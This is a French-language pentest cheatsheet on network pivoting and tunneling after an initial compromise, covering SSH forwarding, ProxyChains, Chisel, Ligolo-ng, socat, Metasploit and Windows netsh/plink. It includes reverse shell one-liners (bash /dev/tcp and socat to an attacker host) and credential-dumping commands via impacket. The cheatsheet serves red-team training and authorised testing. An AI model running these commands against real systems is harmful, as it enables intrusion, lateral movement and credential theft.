# Pivoting Cheatsheet

Référence rapide des techniques de pivoting et de tunneling utilisées en pentest pour se déplacer à travers les réseaux internes après un accès initial.

## Concepts de base
```
[Attaquant] ──→ [Machine pivot] ──→ [Réseau interne]
   ATK             PIVOT               CIBLE
192.168.1.10    192.168.1.50        10.10.10.0/24
                10.10.10.1
```

| Terme | Description |
|---|---|
| Pivot | Machine compromise servant de relais |
| Tunnel | Canal de communication chiffré |
| Port Forwarding | Redirection de port |
| SOCKS Proxy | Proxy générique pour tout le trafic |
| Reverse | Connexion initiée depuis la cible vers l'attaquant |

## SSH Tunneling

### Local Port Forwarding

Rendre un service interne accessible localement.
```bash
# Syntaxe
ssh -L <local_port>:<remote_host>:<remote_port> user@<pivot>

# Exemples
# Accéder à RDP interne
ssh -L 3389:10.10.10.10:3389 user@<pivot>

# Accéder à un serveur web interne
ssh -L 8080:10.10.10.10:80 user@<pivot>

# Accéder à MySQL interne
ssh -L 3306:10.10.10.10:3306 user@<pivot>

# Utiliser le service forwardé
xfreerdp /u:user /p:password /v:127.0.0.1:3389
curl http://127.0.0.1:8080
```

### Remote Port Forwarding

Exposer un service local sur la machine distante.
```bash
# Syntaxe
ssh -R <remote_port>:localhost:<local_port> user@<pivot>

# Exemples
# Exposer un listener local sur le pivot
ssh -R 4444:localhost:4444 user@<pivot>

# Exposer un serveur HTTP local
ssh -R 8080:localhost:80 user@<pivot>
```

### Dynamic Port Forwarding — SOCKS Proxy

Créer un proxy SOCKS pour router tout le trafic via le pivot.
```bash
# Créer le proxy SOCKS5
ssh -D 1080 user@<pivot>

# En arrière-plan
ssh -D 1080 -f -N user@<pivot>

# Avec clé SSH
ssh -D 1080 -i id_rsa user@<pivot>

# Configurer ProxyChains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Utiliser via ProxyChains
proxychains nmap -sT 10.10.10.0/24
proxychains curl http://10.10.10.10
proxychains evil-winrm -i 10.10.10.10 -u user -p password
proxychains impacket-psexec domain/user:password@10.10.10.10
```

### SSH sans TTY — Background
```bash
# Tunnel en arrière-plan sans shell
ssh -f -N -D 1080 user@<pivot>
ssh -f -N -L 3389:10.10.10.10:3389 user@<pivot>

# Keepalive pour maintenir la connexion
ssh -o ServerAliveInterval=30 -D 1080 user@<pivot>
```

## ProxyChains

### Configuration
```bash
# /etc/proxychains4.conf
cat > /etc/proxychains4.conf << EOF
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

# Chaîner plusieurs proxies
cat >> /etc/proxychains4.conf << EOF
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF
```

### Usage
```bash
# Nmap via ProxyChains (TCP uniquement)
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.10

# Outils courants
proxychains curl http://10.10.10.10
proxychains wget http://10.10.10.10/file
proxychains ssh user@10.10.10.10
proxychains evil-winrm -i 10.10.10.10 -u user -p password
proxychains impacket-psexec domain/user:password@10.10.10.10
proxychains impacket-secretsdump domain/user:password@10.10.10.10
proxychains xfreerdp /u:user /p:password /v:10.10.10.10
```

## Chisel

Outil de tunneling TCP/UDP via HTTP — idéal pour traverser les firewalls.

### Installation
```bash
# Télécharger
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
mv chisel_linux_amd64 chisel
```

### Reverse SOCKS — le plus courant
```bash
# 1. Sur l'attaquant — démarrer le serveur
chisel server -p 8080 --reverse

# 2. Sur le pivot — connecter le client
./chisel client <ATK>:8080 R:socks

# 3. ProxyChains sur l'attaquant (port 1080 par défaut)
proxychains nmap -sT 10.10.10.0/24
```

### Port Forwarding
```bash
# Serveur attaquant
chisel server -p 8080 --reverse

# Client pivot — forwarder RDP interne
./chisel client <ATK>:8080 R:3389:10.10.10.10:3389

# Connexion depuis l'attaquant
xfreerdp /u:user /p:password /v:127.0.0.1:3389
```

### Forward SOCKS (si accès entrant possible)
```bash
# Serveur sur le pivot
./chisel server -p 8080 --socks5

# Client sur l'attaquant
chisel client <pivot>:8080 socks
```

### Chisel multi-hop
```bash
# Pivot 1
./chisel client <ATK>:8080 R:socks

# Pivot 2 (via pivot 1)
proxychains ./chisel client <ATK>:8081 R:socks

# ProxyChains chaîné
socks5 127.0.0.1 1080    # Via pivot 1
socks5 127.0.0.1 1081    # Via pivot 2
```

## Ligolo-ng

Outil de tunneling moderne — crée une interface réseau virtuelle.

### Installation
```bash
# Télécharger proxy (attaquant) et agent (cible)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy-linux-amd64
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent-linux-amd64
chmod +x proxy-linux-amd64 agent-linux-amd64
```

### Setup
```bash
# 1. Créer l'interface tun sur l'attaquant
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Démarrer le proxy sur l'attaquant
./proxy-linux-amd64 -selfcert

# 3. Démarrer l'agent sur le pivot
./agent-linux-amd64 -connect <ATK>:11601 -ignore-cert

# 4. Dans la console Ligolo
session                              # Sélectionner la session
start                                # Démarrer le tunnel

# 5. Ajouter la route sur l'attaquant
sudo ip route add 10.10.10.0/24 dev ligolo

# 6. Accéder au réseau interne directement
nmap -sT 10.10.10.0/24
curl http://10.10.10.10
```

### Ligolo — Listener reverse
```bash
# Dans la console Ligolo — ajouter un listener
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Reverse shell depuis la cible interne vers l'attaquant
bash -i >& /dev/tcp/<pivot_ip>/4444 0>&1
```

## Netcat Port Forwarding

### Relay simple
```bash
# Sur le pivot — forwarder le port 80 interne vers l'attaquant
mkfifo /tmp/pipe
nc -lvnp 8080 < /tmp/pipe | nc 10.10.10.10 80 > /tmp/pipe
```

### ncat avec proxy
```bash
# ncat proxy
ncat -l 8080 --sh-exec "ncat 10.10.10.10 80"
```

## Socat

### Port Forwarding simple
```bash
# Forwarder le port local vers cible interne
socat TCP-LISTEN:3389,fork TCP:10.10.10.10:3389

# Avec fork pour connexions multiples
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.10:80
```

### Reverse Shell via socat
```bash
# Attaquant — écoute
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Cible — connexion
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATK>:4444
```

## Metasploit — Pivoting

### Route via session Meterpreter
```bash
# Dans Metasploit — ajouter une route via la session
route add 10.10.10.0/24 <session_id>
route print

# Ou via autoroute
use post/multi/manage/autoroute
set SESSION <session_id>
set SUBNET 10.10.10.0
run

# Scanner via la route
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,443,445,3389
run
```

### SOCKS via Metasploit
```bash
# Créer un proxy SOCKS via Metasploit
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run

# Combiner avec ProxyChains
proxychains nmap -sT 10.10.10.0/24
```

### Port Forwarding Meterpreter
```bash
# Dans une session Meterpreter
portfwd add -l 3389 -p 3389 -r 10.10.10.10
portfwd add -l 8080 -p 80 -r 10.10.10.10
portfwd list
portfwd delete -l 3389
```

## RPivot

Tunneling SOCKS via HTTP — contourne les proxies web d'entreprise.
```bash
# Attaquant — serveur
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0

# Pivot — client
python client.py --server-ip <ATK> --server-port 9999

# Via proxy d'entreprise
python client.py --server-ip <ATK> --server-port 9999 \
  --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 \
  --domain domain.com --username user --password password
```

## Techniques Windows

### Netsh — Port Forwarding natif
```cmd
# Forwarder le port 3389 local vers cible interne
netsh interface portproxy add v4tov4 \
  listenport=3389 listenaddress=0.0.0.0 \
  connectport=3389 connectaddress=10.10.10.10

# Lister les règles
netsh interface portproxy show all

# Supprimer
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0
```

### Plink — SSH depuis Windows
```cmd
# Tunnel SOCKS depuis Windows
plink.exe -ssh -D 1080 user@<ATK>

# Local port forwarding
plink.exe -ssh -L 3389:10.10.10.10:3389 user@<ATK>

# Sans vérification host
plink.exe -ssh -D 1080 -N user@<ATK> -batch
```

## Double Pivot

Accéder à un troisième réseau via deux pivots.
```bash
# Réseau : ATK → Pivot1 → Pivot2 → Réseau cible

# 1. Tunnel vers Pivot1
ssh -D 1080 user@<pivot1>

# 2. Tunnel vers Pivot2 via ProxyChains
proxychains ssh -D 1081 user@<pivot2>

# 3. ProxyChains chaîné
cat /etc/proxychains4.conf
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081

# 4. Accès au réseau cible
proxychains nmap -sT 172.16.0.0/24
```

### Double pivot avec Chisel
```bash
# Pivot 1 → ATK
./chisel client <ATK>:8080 R:socks        # Port 1080

# Pivot 2 → ATK (via pivot 1)
proxychains ./chisel client <ATK>:8081 R:1081:socks

# ProxyChains
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

## Découverte Réseau Interne

Une fois le pivot établi :
```bash
# Scan hôtes actifs
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24

# Scan rapide via Metasploit
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,135,139,443,445,3389,5985

# Depuis le pivot directement (si shell disponible)
for ip in $(seq 1 254); do ping -c 1 10.10.10.$ip | grep "bytes from"; done
```

## Tableau Comparatif des Outils

| Outil | Type | OS | Avantages | Inconvénients |
|---|---|---|---|---|
| SSH | Tunnel | Linux/Windows | Natif, fiable | Nécessite SSH |
| Chisel | HTTP Tunnel | Linux/Windows | Traverse les firewalls | Binaire à déposer |
| Ligolo-ng | TUN Interface | Linux/Windows | Transparent, rapide | Setup plus complexe |
| Metasploit | Route/SOCKS | Linux/Windows | Intégré à MSF | Bruyant |
| Netsh | Port Forward | Windows | Natif Windows | Windows uniquement |
| Socat | Port Forward | Linux | Polyvalent | Syntaxe complexe |
| RPivot | HTTP SOCKS | Linux/Windows | Bypass proxy entreprise | Python requis |

::: info Tips Red Team

- **Ligolo-ng** est le meilleur choix en 2024 — transparent, rapide et ne nécessite pas ProxyChains
- **Chisel** est idéal quand seul le port 80/443 est ouvert vers l'extérieur
- Toujours synchroniser ProxyChains avec le port SOCKS configuré
- Nmap via ProxyChains nécessite `-sT` (TCP Connect) — le scan SYN ne fonctionne pas
- Utiliser `-Pn` avec Nmap via proxy — le ping ICMP ne passe pas par le tunnel
- Garder les tunnels SSH en vie avec `ServerAliveInterval=30` dans la config SSH
- Ligolo-ng permet d'utiliser tous les outils sans ProxyChains — net gain de temps

:::


::: details Checklist

- Accès initial obtenu sur le pivot
- Réseau interne identifié
- Méthode de tunneling choisie
- Tunnel établi et testé
- ProxyChains configuré
- Réseau interne scanné
- Services internes identifiés
- Double pivot configuré si nécessaire
- Accès aux cibles internes validé
- Tunnel maintenu et stable

:::

## Notes
```
 # Notes 
```

## Ressources

- [HackTricks Tunneling](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
- [Chisel GitHub](https://github.com/jpillora/chisel)
- [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [PayloadsAllTheThings Network Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
- [RPivot GitHub](https://github.com/klsecservices/rpivot)



<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/cheatsheets/pivoting.md)</span>

</div>